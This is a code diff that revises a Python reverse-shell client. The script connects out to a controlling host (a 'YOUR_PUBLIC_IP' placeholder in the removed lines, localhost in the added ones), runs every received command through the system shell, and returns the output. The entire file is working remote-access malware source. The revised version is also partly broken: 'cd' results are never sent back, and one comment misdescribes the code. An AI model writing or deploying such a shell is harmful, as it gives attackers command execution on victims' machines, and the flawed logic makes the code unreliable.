@@ -1,36 +1,42 @@
 import socket
 import subprocess
+import sys
 import os
-import ctypes
 
-# Create a TCP/IP socket
-server_address = 'YOUR_PUBLIC_IP'
-try:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Connect the socket to the port where the server is listening
-    server_address = (server_address, 10000)
-    print('connecting to {} port {}'.format(*server_address))
-    sock.connect(server_address)
-except socket.error as error:
-    print(f"Error Connecting:{str(error)}")
-    exit()
+HOST = '127.0.0.1'  # IP address of the server
+PORT = 5555        # Same port as the server
 
-while True:
-    server_cmd = str(sock.recv(1024), "utf-8")
-    if(len(server_cmd) > 0):
+
+def main():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+    except Exception as e:
+        sys.exit("Failed to connect to server: " + str(e))
+
+    while True:
+        command = s.recv(1024).decode()
+        if not command:
+            break
         try:
-            if(server_cmd[:2] == 'cd'):
-                path = server_cmd[2:].strip()
-                chdir = os.chdir(path)
-                print(chdir)
-                curr_dir = os.getcwd()
-                print(curr_dir)
-                output = str.encode(curr_dir)
-                sock.send(output)
-            else:   
-                output = subprocess.Popen(server_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
-                output_str = str(output, 'utf-8')
-                sock.send(output)
-
+            if command.lower() == 'exit':
+                s.send(command.encode())
+                break
+            elif command.startswith("cd "):
+                try:
+                    os.chdir(command[3:])
+                    output = f"Changed directory to {os.getcwd()}"
+                except OSError as e:
+                    output = f"Could not change directory: {e}"
+            else:
+                # receive output from client and print it
+                output = subprocess.getoutput(command)
+                s.send(output.encode())
         except:
-            sock.send(str.encode("Something went wrong!"))
+            break
+    s.close()
+    sys.exit()
+
+
+if __name__ == '__main__':
+    main()
